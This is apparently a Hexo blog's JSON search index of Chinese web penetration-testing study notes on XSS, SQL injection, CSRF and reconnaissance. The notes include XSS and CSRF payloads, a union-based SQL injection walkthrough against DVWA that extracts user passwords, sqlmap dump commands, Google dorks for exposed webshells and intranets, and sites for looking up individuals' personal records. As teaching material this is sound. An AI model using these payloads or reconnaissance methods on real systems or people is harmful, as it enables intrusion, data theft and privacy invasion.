{"pages":[{"title":"About","date":"2020-06-25T16:59:45.456Z","path":"about/index.html","text":""},{"title":"Categories","date":"2020-06-25T16:59:45.457Z","path":"categories/index.html","text":""},{"title":"Tags","date":"2020-06-25T16:59:45.458Z","path":"tags/index.html","text":""}],"posts":[{"title":"Hello World","date":"2020-09-11T23:56:29.986Z","path":"wiki/hello-world/","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","tags":[],"categories":[]},{"title":"第六节 一文搞懂XSS跨站脚本攻击","date":"2020-07-24T09:35:37.000Z","path":"wiki/渗透测试/Web渗透/学习笔记/第六节 一文搞懂XSS跨站脚本攻击/","text":"0x00 XSS跨站脚本概要1、什么是XSS跨站脚本漏洞？XSS跨站脚本（Cross-Site Scripting，XSS）自1996年诞生以来，如今已经历十多年的演化。由于和另一种网页技术-层叠样式表（Cascading Style Sheets，CSS）的缩写一样，为了防止混淆，故把原本的CSS简称为XSS。在各种WEB应用安全漏洞中，XSS跨站脚本攻击漏洞一直被OWASP（Open Web Application Security Project）组织评为十大应用安全中的其中之一。【参考OWASP TOP 10：2007年A2 / 2010年A2 / 2013年A3】 XSS最大的特点就是能注入恶意的HTML/JavaScript代码到用户浏览的网页上，是因WEB应用程序对用户输入过滤不足而产生的，当用户浏览这些网页时，就会执行其中的恶意代码。由于HTML代码和客户端JavaScript脚本能在受害者主机上的浏览器任意执行，这样等同于完全控制了WEB客户端的逻辑，在这个基础上，黑客可以轻易地发起Cookie窃取，会话劫持，钓鱼欺骗等各种各样的攻击。 通常情况下，我们既可以把XSS理解成一种WEB应用安全漏洞，也可以理解成一种攻击手段。 2、XSS攻击流程 3、恶意脚本的形式利用XSS弹警告框： 1&lt;script&gt;alert(‘xss’)&lt;/script&gt; 获取cookie值： 1&lt;script&gt;alert(document.cookie)&lt;/script&gt; 嵌入其他网站： 1&lt;iframe src=http://baidu.com width=0 height=0&gt;&lt;/iframe&gt; XSS输入也可能是HTML代码段，如使网页不停刷新： 1&lt;meta http-equiv=\"refresh\" content=\"0;\"&gt; 4、XSS危害检验概括 网络钓鱼，包括盗取各类用户账号 窃取用户cookie资料，从而获取用户隐私信息，或利用用户身份进一步对网站执行操作 劫持用户（浏览器）会话，从而执行任意操作，例如进行非法转账，强制发表日志，发送电子邮件等 强制弹出广告页面，刷流量等 网页挂马 进行恶意操作，例如任意篡改页面信息，删除文章等 进行大量的客户端攻击，如DDOS攻击 获取客户端信息，例如用户的浏览历史，真实ip，开放端口等 控制受害者机器向其他网站发起攻击 结合其他漏洞进一步扩大攻击 提升用户权限，包括进一步渗透网站 传播XSS跨站脚本蠕虫等0x01 XSS跨站脚本分类1、反射型XSS1.1反射型XSS概述反射型XSS也被称为非持久性XSS，是现在最容易出现的一种XSS漏洞。当用户访问一个带有XSS代码的URL请求时，服务器端接收数据后处理，然后把带有XSS代码的数据发送到浏览器，浏览器解析这段带有XSS代码的数据后，最终造成XSS漏洞。例子：1234&lt;?php$username = $_GET['username'];echo $username;?&gt; 在这段代码中，程序接收username值后再输出，如果提交xss1.php?username=test，那么程序将输出test，如果攻击者输入username=alert(‘xss’)，将会造成反射型XSS漏洞。1.2反射型XSS的流程 2、存储型XSS2.1 存储型XSS概述存储型XSS又被称为持久性XSS，存储型XSS是最危险的一种跨站脚本。允许用户存储数据的WEB应用程序都可能会出现存储型XSS漏洞，当攻击者提交一段XSS代码后，被服务器端接收并存储，当再次访问页面时，这段XSS代码被程序读取响应给浏览器，造成XSS跨站攻击，这就是存储型XSS。在测试是否存在XSS时，首先要确定输入点与输出点，例如：我们要在留言内容上测试XSS漏洞，首先就要去寻找留言内容输出（显示）的地方是在标签内还是标签属性内，或者在其他地方，如果输出的数据在属性内，那么XSS是不会被执行的。 2.2存储型XSS攻击流程 DOM型XSS0x02 检测XSS漏洞1、手工检测使用手工检测WEB应用程序是否存在XSS漏洞时，最重要的是考虑哪里有输入、输入的数据在什么地方输出。1.可得知输出的位置输入一些敏感字符，例如”、’、&lt;、&gt;、(、)等，在提交请求后查看HTML源代码，看这些输入的字符是否被转义。2.无法得知输出位置很多WEB应用程序源代码是不对外公开的，这时在测试XSS时就有可能无法得知输入数据到底在哪里显示。比如，测试留言本，留言之后要经过审核才显示，这时候就无法得知输入的数据在后台管理页面是何种状态。通常可以采用””/&gt;XSS来测试。 2、工具检测AppscanAWVSBurpSuite 3、检测思路提交正常数据，使用firebug，chrome的调试等工具跟踪提交数据的标签，如果显示区域不在HTML属性内，则可以直接使用XSS代码注入。如果说不能得知内容输出的具体位置，则可以使用模糊测试。无论存储型XSS，还是反射型XSS。本质问题就是让对方浏览器执行你插入的JavaScript！ 0x03 漏洞利用盗取cookie，登录账号的场景演示假如http://test.com/xss1.php存在XSS反射型跨站漏洞，那么攻击者的步骤可能如下。 test1是网站test.com的用户，此时正在登录的状态中。 攻击者发现http://test.com/xss1.php存在XSS反射型跨站漏洞，然后精心构造JavaScript代码，此段代码可以窃取用户的cookie。 攻击者将带有反射型XSS漏洞的URL通过站内信息发送给用户test1，使用各种诱导的方式让用户test1去打开链接。 如果用户test1打开了带有XSS漏洞的URL，那么就会把自己的cookie发送到攻击者中。 攻击者接受到用户test1的会话cookie，就可以直接利用cookie以test1的身份登录test.com网站中。 以上步骤，通过使用反射型XSS漏洞可以以test1的身份登录网站，这就是其危害。 演示视频传送门0x04 漏洞防御输入与输出中的过滤黑名单与白名单WEB安全编码规范HttpOnly cookie","tags":[{"name":"XSS","slug":"XSS","permalink":"https://s40d1.github.io/tags/XSS/"}],"categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"Web渗透","slug":"渗透测试/Web渗透","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Web%E6%B8%97%E9%80%8F/"},{"name":"学习笔记","slug":"渗透测试/Web渗透/学习笔记","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Web%E6%B8%97%E9%80%8F/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"第五节 一篇文章搞懂SQL注入","date":"2020-07-24T03:35:37.000Z","path":"wiki/渗透测试/Web渗透/学习笔记/第五节 一篇文章搞懂SQL注入/","text":"0X00 数据库相关概念数据（DATA）：图像、语音、文字在计算机系统中，各种字母、数字符号的组合、语音、图形、图像等统称为数据。 数据库(Database)：Access、MSSQL、Oracle、SQLITE、MySQL等数据库是按照数据结构来组织、存储和管理数据的“仓库”。 数据库管理系统(DBMS)：Access、MSSQL、Oracle、SQLITE、MySQL等数据库管理系统(database management system)是一种操纵和管理数据库的软件，用于建立、使用和维护数据库。它对数据库进行统一的管理和控制，以保证数据库的安全性和完整性。 结构化查询语言(SQL)：DQL、DDL、DML、TCL、DCL结构化查询语言(Structured Query Language)简称SQL，结构化查询语言是一种数据库查询和程序设计语言，用于存取数据以及查询、更新和管理关系数据库系统。 数据库常见的操作1、增删改查：insert，update，delete，select查询user表的所有数据 1select * from user; 查询user表“name”等于“admin”的数据； 1select * from user where name&#x3D;&quot;admin&quot;; 往user表里面增加一个用户admin，并且密码为admin@123，电话1318888888 1insert into user values(&quot;admin&quot;,&quot;admin@123&quot;,&quot;13188888888&quot;); 更改admin用户的密码为password 1update user set password&#x3D;&quot;password&quot; where name&#x3D;&quot;admin&quot;; 删除新增admin用户所在的行 1delete from user where name&#x3D;&quot;admin&quot;; 2、SQL order by 语句order by语句通常是用来做排序的，默认按照升序排序。但是在SQL注入中order by主要用来判断当前表是有多少列，然后配合联合查询来爆数据。order by用法：http://10.1.131.10/cms/show.php?id=35利用order by来看当前表有多少列。 123http:&#x2F;&#x2F;10.1.131.10&#x2F;cms&#x2F;show.php?id&#x3D;35 order by 10回显正常http:&#x2F;&#x2F;10.1.131.10&#x2F;cms&#x2F;show.php?id&#x3D;35 order by 15回显正常http:&#x2F;&#x2F;10.1.131.10&#x2F;cms&#x2F;show.php?id&#x3D;35 order by 16回显不正常 以上说明当前表有15列。 3、union联合查询利用联合查询把2个表的数据合在一个表里面 1select * from user union all select * from table2; 如果不想看到前面的查询内容而只想看到后面的内容，可以使前面的查询结果为false： 1select * from user where name&#x3D;1 union all select * from table2; user表里面没有name=1的，所以前面的查询返回false 4、MySql数据库SQL注入中最常见利用的系统数据库，经常利用系统数据库配合union联合查询来获取数据库相关信息，因为系统数据库中所有信息都在这个数据库里面，比如所有数据库名、所有的表名、列名以及列名的数据库类型等，这里主要关注MYSQL系统数据库information_schema，关注系统数据库的表columns和schema表以及tables表： SCHEMATA表：提供了关于数据库的信息COLUMNS表：给出了表中的列信息TABLES表：给出了关于数据库中的表的信息 4.1 COLUMNS表查询数据库名同表schemata一样，查询columns表里面的table_schema列一样可以得到所有数据库名： 1select distinct table_schema from information_schema.columns; 4.2COLUMNS表查询列名查询当前数据库所有列： 1select distinct column_name from information_schema.columns;查询到当前有2232个列名 4.3COLUMNS表查询表名查询当前所有表名： 1select distinct table_name from information_schema.columns;查询结果当前473个表名 4.4TABLES表查询数据库名同表columns以及schemata一样，查询tables表里面的table_schema列一样可以得到所有数据库名： 1select distinct table_schema from information_schema.tables; 4.5TABLES表查询表名同columns表一样，从tables表里面的所有表名： 1select distinct table_name from information_schema.tables; 4.6MySQL函数SQL函数是在SQL注入中用的比较多的，经常利用SQL函数来判断数据库的版本，当前用户，当前用户权限以及数据库的安装路径等等，以下是常用的MYSQL函数： 12345678910system_user()系统用户名user()用户名current_user() 当前用户名session_user() 连接数据库用的用户名database() 数据库名version() mysql数据库版本load_file() mysql读取本地文件的函数@@datadir 数据库路径@@basedir mysql安装路径@@version_compile_os 操作系统 0X01SQL注入相关概念1、静态页面html或者htm，是一种静态的页面格式，不需要服务器解析其中的脚本。由浏览器如(IE、Chrome等)解析。 1.不依赖数据库2.灵活性差，制作、更新、维护麻烦3.交互性交差，在功能方面有较大的限制4.安全，不存在SQL注入漏洞 2、动态页面asp、aspx、php、jsp等，由相应的脚本引擎来解释执行，根据指令生成静态网页。 1.依赖数据库2.灵活性好，维护简便3.交互性好，功能强大4.存在安全风险，可能存在SQL注入漏洞，这里要纠正一点，不是会动的或者有动态GIF图片就是动态网站，一定要是有上门所述的脚本语言构成的网站，如下图所示是一个php脚本搭建的动态网站 3、WEB应用工作原理 4、SQL注入定义SQL Injection：就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意）的SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句本质：代码数据不区分。成因：未对用户提交的参数数据进行校验或有效的过滤，直接进行SQL语句拼接，改变了原有SQL语句的语义，传入数据库解析引擎中执行。结果：SQL注入。 5、SQL注入触发所有的输入只要和数据库进行交互的，都有可能触发SQL注入常见的包括：Get参数触发SQL注入POST参数触发SQL注入Cookie触发SQL注入其他参与sql执行的输入都有可能进行SQL注入 6、SQL注入过程 7、SQL注入场景一切用户可控参数的地方，比如：URL路径、GET/POST请求参数、HTTP请求头 8、SQL注入的作用 绕过登录验证：使用万能密码登录网站后台等 获取敏感数据：获取网站管理员帐号、密码等 文件系统操作：列目录，读取、写入文件等 注册表操作：读取、写入、删除注册表等 执行系统命令：远程执行命令 0X02 注入漏洞分类1、数字型注入http://www.test.com/test.php?id=1猜测SQL语句为：select * from table where id=1测试： 1http:&#x2F;&#x2F;www.test.com&#x2F;test.php?id&#x3D;1’ SQL语句为：select * from table where id=1’ ，页面出现异常 1http:&#x2F;&#x2F;www.test.com&#x2F;test.php?id&#x3D;1 and 1&#x3D;1 SQL语句为：select * from table where id=1 and 1=1 ，页面正常 1http:&#x2F;&#x2F;www.test.com&#x2F;test.php?id&#x3D;1 and 1&#x3D;2 SQL语句为：select * from table where id=1 and 1=2，返回数据与原始请求不同注：当输入的参数为整型时，如：ID，年龄，页码等，如果存在注入漏洞，则可以认为是数字型注入。 2、字符型注入数字型：select * from table where id =1字符型：select * from table where username=‘test’字符型注入最关键的是如何闭合SQL语句以及注释多余的代码查询内容为字符串时：select * from table where username = ‘test’测试： 1select * from table where username &#x3D; &#39;test and 1&#x3D;1&#39; 无法注入，“test and 1=1”会被数据库当作查询的字符串 1select * from table where username &#x3D; &#39;test&#39; and &#39;1&#39;&#x3D;&#39;1&#39; --&#39; 必须闭合字符串才可以继续注入 数字型不需要单引号闭合，而字符串类型一般要使用单引号来闭合 3、数据库注释的语法 4、测试语句 5、SQL注入分类细化5.1按照数据类型： 数字形（Integer） 字符型（String）5.2按返回结果： 显错注入（Error-Based） 盲注（Boolean/Time-Based Blind）5.3其他分类 POST注入：注入字段在POST数据中 Cookie注入：注入字段在Cookie数据中 搜索注入：注入处为搜索的点 Baes64注入：注入字符串需要经过base64加密 布尔型盲注：即可以根据返回页面判断条件真假的注入 时间延迟型盲注：即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断 报错回显型注入：即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中 联合查询型注入：可以使用union的情况下的注入 堆查询型注入：可以同时执行多条语句的执行时的注入6、演示：以DVWA的字符型注入为例6.1判断是否存在注入执行1http:&#x2F;&#x2F;49.234.33.158&#x2F;DVWA&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&amp;Submit&#x3D;Submit# 结果如下: 再执行 1http:&#x2F;&#x2F;49.234.33.158&#x2F;DVWA&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&#39;&amp;Submit&#x3D;Submit# 结果如下: 表明参数类型为字符型。再执行 1http:&#x2F;&#x2F;49.234.33.158&#x2F;DVWA&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&#39;and&#39;1&#39;&#x3D;&#39;1&amp;Submit&#x3D;Submit# 结果如下: 产生的结果与id=1的内容相同。接着执行 1http:&#x2F;&#x2F;49.234.33.158&#x2F;DVWA&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&#39;and&#39;1&#39;&#x3D;&#39;2&amp;Submit&#x3D;Submit# 不显示任何内容。 表明此处可能存在有注入漏洞。 6.2利用order by判断该数据表的字段数量执行 1http:&#x2F;&#x2F;49.234.33.158&#x2F;DVWA&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&#39;order by 5%23&amp;Submit&#x3D;Submit# 结果如下： 通过更换order by后面的数字，直到能够返回正常的最大值：2 由此可得到该数据表的字段数为2。 6.3用union查询标记可以执行SQL的位置执行 1http:&#x2F;&#x2F;49.234.33.158&#x2F;DVWA&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&#39;union select 1,2%23&amp;Submit&#x3D;Submit# 结果如下是：表明在1,2处可以执行SQL语句。 6.4用datebase（）函数在1处查询当前数据库名执行 1http:&#x2F;&#x2F;49.234.33.158&#x2F;DVWA&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&#39;union select database(),2%23&amp;Submit&#x3D;Submit# 结果为： 6.5查询dvwa数据库的表执行 1http:&#x2F;&#x2F;49.234.33.158&#x2F;DVWA&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&#39;union select (select table_name from information_schema.tables where table_schema &#x3D; &#39;dvwa&#39; limit0,1),2%23&amp;Submit&#x3D;Submit# 结果如下： 得到了dvwa的第一个表guestbook，以同样的方式改变limit的参数为limit1,1可获得第二个表users。如下图： 比较两个表名，推测用户名可能在users表中，故先查询users中的字段。 6.6查询users表中的字段执行 1http:&#x2F;&#x2F;49.234.33.158&#x2F;DVWA&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&#39;union select (select column_name from information_schema.columns where table_schema &#x3D; &#39;dvwa&#39; and table_name &#x3D; &#39;users&#39; limit 0,1),2%23&amp;Submit&#x3D;Submit# 结果如下： 得出来users表的的第一个字段为user_id，同理可得第二个为 first_name，第三个为last_name，第四个为user，第五个为password，第六个为avatar，······ 6.7获取user字段的第二个数据和password字段的第二个数据执行 1http:&#x2F;&#x2F;49.234.33.158&#x2F;dvwa&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&#39;union select (select user from dvwa.users limit 1,1),2%23&amp;Submit&#x3D;Submit# 获得user字段的第二个数据为： 执行 1http:&#x2F;&#x2F;49.234.33.158&#x2F;dvwa&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&#39;union select (select password from dvwa.users limit 1,1),2%23&amp;Submit&#x3D;Submit# 获得password字段的第二个数据 MD5解密密码得： 尝试登陆： 登陆成功！ 0X03 SQL注入的利用工具：sqlmapsqlmap是一个自动化的SQL注入工具，其主要功能是扫描，发现并利用给定的URL的SQL注入漏洞，目前支持的数据库是MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB。采用五种独特的SQL注入技术，分别是： 1）基于布尔的盲注，即可以根据返回页面判断条件真假的注入。 2）基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。 3）基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。 4）联合查询注入，可以使用union的情况下的注入。 5）堆查询注入，可以同时执行多条语句的执行时的注入。sqlmap常用命令 1sqlmap -u http:&#x2F;&#x2F;10.1.131.10&#x2F;cms&#x2F;show.php?id&#x3D;35 --dbs -u 指定检测的URL地址 –dbs列出数据库 1sqlmap -u http:&#x2F;&#x2F;10.1.131.10&#x2F;cms&#x2F;show.php?id&#x3D;35 -D cms --tables 获取指定数据库cms的表名 1sqlmap -u http:&#x2F;&#x2F;10.1.131.10&#x2F;cms&#x2F;show.php?id&#x3D;35 -D cms -T cms_users --columns 获取指定数据库cms及指定表cms_users的列名 1sqlmap -u http:&#x2F;&#x2F;10.1.131.10&#x2F;cms&#x2F;show.php?id&#x3D;35 -D cms -T cms_users -C username,password --dump dump列username和password的值 -r c:\\sqltest.txt 加载请求数据–cookie=COOKIE 登录后的cookie–proxy=”http://127.0.0.1:8080&quot; 使用HTTP代理 0X04防御SQL注入SQL注入的危害这些危害包括但不局限于： 数据库信息泄漏：数据库中存放的用户的隐私信息的泄露。 网页篡改：通过操作数据库对特定网页进行篡改。 网站被挂马，传播恶意软件：修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。 数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员帐户被窜改。 服务器被远程控制，被安装后门。经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。 破坏硬盘数据，瘫痪全系统。 一些类型的数据库系统能够让SQL指令操作文件系统，这使得SQL注入的危害被进一步放大。 防御手段：过滤用户输入过滤对象 用户的输入 提交的URL请求中的参数部分 从cookie中得到的数据 部署防SQL注入系统或脚本过滤类容单引号、双引号、斜杠、反斜杠、冒号、空字符等的字符，如图PHP中利用str_replace方法把特殊字符替换成空格，如下：1234567891011121314151617181920212223function dowith_sql($a)&#123; $a &#x3D; str_replace(&quot;and&quot;,&quot;&quot;,$a); $a &#x3D; str_replace(&quot;execute&quot;,&quot;&quot;,$a); $a &#x3D; str_replace(&quot;update&quot;,&quot;&quot;,$a); $a &#x3D; str_replace(&quot;count&quot;,&quot;&quot;,$a); $a &#x3D; str_replace(&quot;chr&quot;,&quot;&quot;,$a); $a &#x3D; str_replace(&quot;ma&quot;,&quot;&quot;,$a); $a &#x3D; str_replace(&quot;master&quot;,&quot;&quot;,$a); $a &#x3D; str_replace(&quot;truncate&quot;,&quot;&quot;,$a); $a &#x3D; str_replace(&quot;char&quot;,&quot;&quot;,$a); $a &#x3D; str_replace(&quot;declare&quot;,&quot;&quot;,$a); $a &#x3D; str_replace(&quot;select&quot;,&quot;&quot;,$a); $a &#x3D; str_replace(&quot;create&quot;,&quot;&quot;,$a); $a &#x3D; str_replace(&quot;delete&quot;,&quot;&quot;,$a); $a &#x3D; str_replace(&quot;insert&quot;,&quot;&quot;,$a); &#x2F;&#x2F;$a &#x3D; str_replace(&quot;&#39;&quot;,&quot;&quot;,$a); $a &#x3D; str_replace(&quot;\\&quot;&quot;,&quot;&quot;,$a); $a &#x3D; str_replace(&quot; &quot;,&quot;&quot;,$a); $a &#x3D; str_replace(&quot;or&quot;,&quot;&quot;,$a); $a &#x3D; str_replace(&quot;&#x3D;&quot;,&quot;&quot;,$a); $a &#x3D; str_replace(&quot;%20&quot;,&quot;&quot;,$a); return $a;&#125;","tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://s40d1.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"}],"categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"Web渗透","slug":"渗透测试/Web渗透","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Web%E6%B8%97%E9%80%8F/"},{"name":"学习笔记","slug":"渗透测试/Web渗透/学习笔记","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Web%E6%B8%97%E9%80%8F/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"第四节 跨站请求伪造（CSRF）漏洞","date":"2020-07-08T11:17:37.000Z","path":"wiki/渗透测试/Web渗透/学习笔记/第四节 跨站请求伪造（CSRF）漏洞/","text":"[TOC] 0x00 CSRF原理概要1. 概念 CSRF（Cross-Site Request Forgery）是指跨站请求伪造，通常缩写为CSRF或者是XSRF。 也可以这么理解CSRF攻击：攻击者盗用了你的身份（即用了你的COOKIE），以你的名义进行某些非法操作。CSRF能够修改你的密码，使用你的账户发送邮件，获取你的敏感信息，甚至盗走你的财产等。2. 必要条件要完成一次CSRF攻击，受害者必须依次完成三个要素： 登录受信任网站A，并在本地生成Cookie在不登出A的情况下，访问恶意网站B必须是同一浏览器，因为不同浏览器不能相互利用COOKIE 3. 攻击过程原理Web A 为存在CSRF漏洞Web B 为攻击者的恶意网站User C 为Web A的用户 用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A； 在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功； 用户未退出网站A的情况下，在同一浏览器中访问网站B； 网站B接收到用户请求后，返回攻击代码，并发出一个请求要求访问第三方站点A； 浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。 网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致网站B的恶意代码被执行。 4. CSRF与XSS的区别XSS：攻击者发现XSS漏洞——构造代码——发送给受害人——受害人打开——攻击者获取受害人的cookie——完成攻击攻击者需要登录后台完成攻击 CSRF：攻击者发现CSRF漏洞——构造代码——发送给受害人——受害人打开——受害人执行代码——完成攻击攻击是管理员自己实现的，攻击者只负责了构造代码 CSRF少了获取cookie的步骤，为什么会少了呢。因为受害人在执行恶意代码的时候就已经完成了攻击，而攻击者并没有参与进来。 0x01 漏洞分类1. GET型CSRF这种类型的CSRF一般是由于程序员安全意识不强造成的。GET类型的CSRF利用非常简单，只需要一个HTTP请求，所以，一般会这样利用： 1&lt;img src&#x3D;http:&#x2F;&#x2F;漏洞地址&gt; 在访问含有这个img的页面后，成功向http://漏洞地址，发出了一次HTTP请求。所以，如果将该网址替换为存在GET型CSRF的地址，就能完成攻击了。 2. POST型CSRF这种类型的CSRF危害没有GET型的大，利用起来通常使用的是一个自动提交的表单，如： 1234&lt;form action&#x3D;http:&#x2F;&#x2F;漏洞地址 method&#x3D;POST&gt;&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;xx&quot; value&#x3D;&quot;11&quot; &#x2F;&gt;&lt;&#x2F;form&gt;&lt;script&gt; document.forms[0].submit(); &lt;&#x2F;script&gt; 访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作。 3. 常用的CSRF方式123456789101112131415&lt;img&gt;标签属性&lt;img src&#x3D;“http:&#x2F;&#x2F;漏洞地址”&gt;&lt;script&gt;标签属性&lt;script src&#x3D;“http:&#x2F;&#x2F;漏洞地址”&gt;&lt;iframe&gt;标签属性&lt;iframe src&#x3D;“http:&#x2F;&#x2F;漏洞地址”&gt;JavaScript方法Image对象&lt;script&gt;var foo &#x3D; new Image();foo.src &#x3D; “http:&#x2F;&#x2F;漏洞地址”&lt;&#x2F;script&gt; 0x02 攻击演示以bWAPP的CSRF (Transfer Amount)为例入图，原始账户金额为1000EUR使用burpsuite抓包构造POC对生成的POC内转账金额参数值修改将此poc页面放入本地服务器（恶意服务器）在原浏览器访问本地该页面，点击Submit request结果发现账户金额变为800EUR，表示攻击成功 0x03 漏洞检测自动检测：AWVS扫描器半自动检测：CSRFTester 0x04 漏洞防御1、验证HTTP Referer字段2、Token验证3、添加验证码","tags":[{"name":"CSRF","slug":"CSRF","permalink":"https://s40d1.github.io/tags/CSRF/"}],"categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"Web渗透","slug":"渗透测试/Web渗透","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Web%E6%B8%97%E9%80%8F/"},{"name":"学习笔记","slug":"渗透测试/Web渗透/学习笔记","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Web%E6%B8%97%E9%80%8F/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"第二节 信息收集","date":"2020-07-07T14:10:37.000Z","path":"wiki/渗透测试/Web渗透/学习笔记/第二节 信息收集/","text":"0x00信息收集的概念黑客为了更加有效地实施攻击而在攻击前或攻击过程中对目标的所有探测活动。 0x01信息收集的作用 了解安全架构：信息收集使攻击者能够了解组织完整的安全架构 缩小攻击范围：通过IP地址范围、网络、域名、远程访问点等信息，可以缩小攻击范围 建立信息数据库：攻击者能够建立他们自己的相关目标组织安全性弱点的信息数据库来采取下一步的入侵行动 描绘网络拓扑：攻击者可以描绘出目标组织的网络拓扑图，分析最容易进入的攻击路径 *信息收集对于渗透来说是非常重要的一步，收集的信息越详细对以后渗透测试的影响越大，毫不夸张的说，信息的收集决定着渗透的成功与否* 0x02信息收集的分类 被动信息收集：被动信息收集也就是说不会与目标服务器做直接的交互、在不被目标系统察觉的情况下，通过搜索引擎、社交媒体等方式对目标外围的信息进行收集，例如：网站的whois信息、DNS信息、管理员以及工作人员的个人信息等等。 主动信息收集：主动收集会与目标系统有直接的交互，从而得到目标系统相关的一些情报信息。例如：主机开发的端口、站点的目录结构等等。 0x03信息收集的内容 网络信息 系统信息 组织信息 域名 用户和用户组名 员工信息 内网域名 系统标示banner 组织网站 网段 路由表 公司地址 授权可访问的IP地址 SNMP信息 信息详情 内部网站 系统架构 地址和电话号码 开放的TCP/UDP端口 远程系统类型 邮箱地址 访问控制机制和ACL 系统用户名 HTML代码中的注释 运行的网络协议 密码 实行的安全策略 VPN接入点 站点目录 与组织相关的WEB服务 访问控制策略 测试/临时文件 组织的背景 运行的IDS监听策略 发布的新闻 模拟、数字电话号码 认证机制 系统评估措施 防火墙等安全设施 0x04信息收集的方法方法概览：搜索引擎，网站，邮件，竞争情报，Google，whois，DNS，网络信息收集，社会工程学，社交网站。 地理位置使用在线地图寻找 查询个人信息网站查询 公积金：http://www.bjgjj.gov.cn/ 社保四险：http://www.bjld.gov.cn/csibiz/home/index.html 驾驶证信息：http://www.bjjtgl.gov.cn/publish/portal0/ 工作居住证：http://210.73.77.4/uamsso/ 电子学历：http://www.chsi.com.cn/xlcx/ 信用卡记录：各银行信用卡网站申请进度查询 公交一卡通查询：http://www.bmac.com.cn/Google语法社工库查询网站信息收集目标网站可能提供 使用的软件及版本 使用的操作系统 子目录及参数 文件名、路径、数据库字段名及查询语句 脚本平台 通讯信息和内容管理系统详情使用Burp Suite , Firebug等工具来浏览头部能够提供的信息： 连接状态和内容种类 接收范围 最后编辑信息 X-Powered-By信息 使用的Web服务及版本信息 核查HTML源码可获得： 代码中的注释 web开发或管理员的联系详情 文件系统架构 脚本类型 核查Cookies可获得：使用的软件和它的使用习惯信息使用的脚本平台 邮件信息 Google hacking Site 指定域名 Intext 正文中存在关键字的网页 Intitle 标题中存在关键字的网页 Info 一些基本信息 Inurl url存在关键字的网页 Filetype 搜索指定文件类型 例如：“intitle:管理登录 filetype:php” 查询页面标题含有“管理登录”，并且为php类型的网站。 查找利用php webshell1intitle:&quot;php shell*&quot; &quot;Enable stderr&quot; filetype:php intitle—网页标题Enable stderr—UNIX标准输出和标准错误的缩写filetype—文件类型 访问目标公司的私有网络和收集诸如员工列表、联系方式等敏感信息1intitle:intranet inurl:intranet+intext:”human resources” shodan搜索引擎Shoudan是一个用于帮助发现主要的互联网系统漏洞（包括路由器，交换机，工控系统等）的搜索引擎。它在圈子里就像google一样出名。它主要拦截从服务器到客户端的元数据来工作，目前提供超过50个端口的相关搜索。 shodan能找到的设备服务器路由器交换机公共ip打印机网络摄像头加油站的泵Voip电话和所有数据采集监控系统 shodan能做的用户搜索定制项目寻找端口并拦截数据拦截的数据设置索引显示结果 shodan网站信息收集 